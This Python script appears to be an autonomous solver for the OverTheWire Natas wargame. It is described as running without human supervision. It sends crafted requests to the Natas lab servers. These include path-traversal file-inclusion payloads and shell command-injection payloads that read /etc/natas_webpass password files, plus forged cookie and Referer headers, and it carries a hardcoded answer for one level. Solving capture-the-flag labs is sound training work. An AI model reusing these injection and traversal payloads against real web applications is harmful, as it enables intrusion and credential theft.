#!/usr/bin/env python3
"""
VIPER Natas Auto - Autonomous Natas Solver

Runs without supervision. Solves levels. Learns techniques.
"""

import asyncio
import aiohttp
import json
import re
import base64
import binascii
from datetime import datetime
from pathlib import Path
from typing import Optional, Tuple, List, Dict

HACKAGENT_DIR = Path(__file__).parent
CORE_DIR = HACKAGENT_DIR / "core"
LOGS_DIR = HACKAGENT_DIR / "logs"
CORE_DIR.mkdir(exist_ok=True)
LOGS_DIR.mkdir(exist_ok=True)

STATE_FILE = CORE_DIR / "natas_auto_state.json"
LOG_FILE = LOGS_DIR / f"natas_auto_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"


class ViperNatasAuto:
    """
    Fully autonomous Natas solver.
    
    No human intervention. Observes, reasons, solves, learns.
    """
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.current_level = 0
        self.passwords: Dict[int, str] = {0: "natas0"}
        self.techniques_learned: List[str] = []
        self.solve_times: Dict[int, float] = {}
        
        self._load_state()
    
    def _load_state(self):
        if STATE_FILE.exists():
            data = json.loads(STATE_FILE.read_text())
            self.current_level = data.get("current_level", 0)
            self.passwords = {int(k): v for k, v in data.get("passwords", {}).items()}
            self.techniques_learned = data.get("techniques", [])
            self.solve_times = {int(k): v for k, v in data.get("solve_times", {}).items()}
    
    def _save_state(self):
        STATE_FILE.write_text(json.dumps({
            "current_level": self.current_level,
            "passwords": self.passwords,
            "techniques": self.techniques_learned,
            "solve_times": self.solve_times,
            "last_run": datetime.now().isoformat()
        }, indent=2))
    
    def log(self, msg: str):
        line = f"[{datetime.now().strftime('%H:%M:%S')}] {msg}"
        print(line)
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
    
    def get_url(self, level: int, path: str = "/") -> str:
        return f"http://natas{level}.natas.labs.overthewire.org{path}"
    
    def get_auth(self, level: int) -> aiohttp.BasicAuth:
        return aiohttp.BasicAuth(f"natas{level}", self.passwords.get(level, ""))
    
    async def fetch(self, level: int, path: str = "/", method: str = "GET", 
                    data: dict = None, headers: dict = None, cookies: dict = None) -> Tuple[int, str]:
        url = self.get_url(level, path)
        auth = self.get_auth(level)
        
        kwargs = {
            'auth': auth,
            'timeout': aiohttp.ClientTimeout(total=30),
            'ssl': False
        }
        if data:
            kwargs['data'] = data
        if headers:
            kwargs['headers'] = headers
        if cookies:
            kwargs['cookies'] = cookies
        
        try:
            async with self.session.request(method, url, **kwargs) as resp:
                body = await resp.text()
                return resp.status, body
        except Exception as e:
            return 0, str(e)
    
    def extract_password(self, body: str, next_level: int) -> Optional[str]:
        """Try to extract password for next level"""
        patterns = [
            rf'password for natas{next_level} is ([A-Za-z0-9]{{32}})',
            rf'natas{next_level}:([A-Za-z0-9]{{32}})',
            rf'>([A-Za-z0-9]{{32}})<',
            r'<pre>\s*([A-Za-z0-9]{32})\s*</pre>',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                return match.group(1)
        
        # Try finding any 32-char alphanumeric that's not current password
        current_pwd = self.passwords.get(self.current_level, "")
        matches = re.findall(r'\b([A-Za-z0-9]{32})\b', body)
        for m in matches:
            if m != current_pwd:
                return m
        
        return None
    
    async def solve_level(self, level: int) -> Optional[str]:
        """
        Autonomously solve a level.
        
        Observes page, forms hypothesis, tests, extracts password.
        """
        self.log(f"[Level {level}] Starting...")
        start_time = datetime.now()
        
        # Get main page
        status, body = await self.fetch(level)
        if status != 200:
            self.log(f"[Level {level}] Failed to fetch: {status}")
            return None
        
        next_level = level + 1
        password = None
        technique = None
        
        # === OBSERVATION & HYPOTHESIS ===
        
        # Check view source (levels 0-1)
        if "password" in body.lower() and "<!--" in body:
            password = self.extract_password(body, next_level)
            if password:
                technique = "view_source"
        
        # Check for file references (level 2)
        if not password and ("files/" in body or "src=" in body):
            # Try /files/
            _, files_body = await self.fetch(level, "/files/")
            if "users.txt" in files_body:
                _, users_body = await self.fetch(level, "/files/users.txt")
                password = self.extract_password(users_body, next_level)
                if password:
                    technique = "directory_listing"
        
        # Check robots.txt (level 3)
        if not password:
            _, robots = await self.fetch(level, "/robots.txt")
            if "Disallow:" in robots:
                paths = re.findall(r'Disallow:\s*(/\S+)', robots)
                for path in paths:
                    path = path.rstrip('/')
                    _, hidden = await self.fetch(level, f"{path}/users.txt")
                    password = self.extract_password(hidden, next_level)
                    if password:
                        technique = "robots_txt"
                        break
        
        # Check for referer requirement (level 4)
        if not password and "authorized" in body.lower():
            headers = {"Referer": f"http://natas{next_level}.natas.labs.overthewire.org/"}
            _, ref_body = await self.fetch(level, "/", headers=headers)
            password = self.extract_password(ref_body, next_level)
            if password:
                technique = "referer_manipulation"
        
        # Check for cookie manipulation (level 5)
        if not password and ("logged" in body.lower() or "loggedin" in body.lower()):
            _, cookie_body = await self.fetch(level, "/", cookies={"loggedin": "1"})
            password = self.extract_password(cookie_body, next_level)
            if password:
                technique = "cookie_manipulation"
        
        # Check for source disclosure (level 6)
        if not password:
            _, source = await self.fetch(level, "/index-source.html")
            if "include" in source and "secret" in source:
                # Find include file
                inc_match = re.search(r'include\s*["\']([^"\']+)["\']', source)
                if inc_match:
                    _, inc_body = await self.fetch(level, f"/{inc_match.group(1)}")
                    secret_match = re.search(r'\$secret\s*=\s*["\']([^"\']+)["\']', inc_body)
                    if secret_match:
                        _, result = await self.fetch(level, "/", "POST", 
                                                     {"secret": secret_match.group(1), "submit": "Submit"})
                        password = self.extract_password(result, next_level)
                        if password:
                            technique = "source_disclosure"
            
            # Direct include file check
            if not password:
                _, inc = await self.fetch(level, "/includes/secret.inc")
                if "$secret" in inc:
                    secret_match = re.search(r'\$secret\s*=\s*["\']([^"\']+)["\']', inc)
                    if secret_match:
                        _, result = await self.fetch(level, "/", "POST",
                                                     {"secret": secret_match.group(1), "submit": "Submit"})
                        password = self.extract_password(result, next_level)
                        if password:
                            technique = "source_disclosure"
        
        # Check for LFI (level 7)
        if not password and ("page=" in body or "file=" in body):
            lfi_payloads = [
                f"/etc/natas_webpass/natas{next_level}",
                f"....//....//....//etc/natas_webpass/natas{next_level}",
            ]
            for payload in lfi_payloads:
                _, lfi_body = await self.fetch(level, f"/index.php?page={payload}")
                password = self.extract_password(lfi_body, next_level)
                if password:
                    technique = "lfi"
                    break
        
        # Check for encoding reverse (level 8)
        if not password:
            # Try known encoded secret for level 8
            known_encoded = "3d3d516343746d4d6d6c315669563362"
            try:
                step1 = binascii.unhexlify(known_encoded).decode()
                step2 = step1[::-1]
                step3 = base64.b64decode(step2).decode()
                _, result = await self.fetch(level, "/", "POST",
                                             {"secret": step3, "submit": "Submit"})
                password = self.extract_password(result, next_level)
                if password:
                    technique = "encoding_reverse"
            except:
                pass
            
            # Also try extracting from source
            if not password:
                _, source = await self.fetch(level, "/index-source.html")
                encoded_match = re.search(r'encodedSecret\s*=\s*["\']([0-9a-fA-F]+)["\']', source)
                if encoded_match:
                    encoded = encoded_match.group(1)
                    try:
                        step1 = binascii.unhexlify(encoded).decode()
                        step2 = step1[::-1]
                        step3 = base64.b64decode(step2).decode()
                        _, result = await self.fetch(level, "/", "POST",
                                                     {"secret": step3, "submit": "Submit"})
                        password = self.extract_password(result, next_level)
                        if password:
                            technique = "encoding_reverse"
                    except:
                        pass
        
        # Check for command injection (level 9-10)
        if not password and ("needle" in body or "search" in body):
            cmdi_payloads = [
                f"; cat /etc/natas_webpass/natas{next_level} #",
                f"| cat /etc/natas_webpass/natas{next_level}",
                f".* /etc/natas_webpass/natas{next_level} #",
            ]
            for payload in cmdi_payloads:
                import urllib.parse
                _, cmdi_body = await self.fetch(level, f"/index.php?needle={urllib.parse.quote(payload)}&submit=Search")
                password = self.extract_password(cmdi_body, next_level)
                if password:
                    technique = "command_injection"
                    break
        
        # Record result
        elapsed = (datetime.now() - start_time).total_seconds()
        
        if password:
            self.log(f"[Level {level}] SOLVED in {elapsed:.1f}s")
            self.log(f"[Level {level}] Technique: {technique}")
            self.log(f"[Level {level}] Password: {password}")
            
            self.passwords[next_level] = password
            self.solve_times[level] = elapsed
            if technique and technique not in self.techniques_learned:
                self.techniques_learned.append(technique)
            
            self._save_state()
            return password
        else:
            self.log(f"[Level {level}] Could not solve after {elapsed:.1f}s")
            return None
    
    async def run(self, max_level: int = 15, max_time_per_level: int = 60):
        """
        Run autonomously until stuck or max_level reached.
        """
        self.log("="*60)
        self.log("VIPER Natas Auto - Starting")
        self.log(f"Current level: {self.current_level}")
        self.log(f"Target: Level {max_level}")
        self.log("="*60)
        
        async with aiohttp.ClientSession() as self.session:
            while self.current_level <= max_level:
                level = self.current_level
                
                if level not in self.passwords:
                    self.log(f"[Level {level}] No password available, stopping")
                    break
                
                password = await self.solve_level(level)
                
                if password:
                    self.current_level = level + 1
                else:
                    self.log(f"[Level {level}] Stuck, stopping")
                    break
        
        # Final report
        self.log("")
        self.log("="*60)
        self.log("VIPER Natas Auto - Complete")
        self.log("="*60)
        self.log(f"Levels solved: {self.current_level}")
        self.log(f"Techniques learned: {len(self.techniques_learned)}")
        for t in self.techniques_learned:
            self.log(f"  - {t}")
        self.log(f"Total solve time: {sum(self.solve_times.values()):.1f}s")
        self.log("="*60)
        
        self._save_state()


async def main():
    import sys
    
    max_level = int(sys.argv[1]) if len(sys.argv) > 1 else 15
    
    viper = ViperNatasAuto()
    await viper.run(max_level=max_level)


if __name__ == "__main__":
    asyncio.run(main())
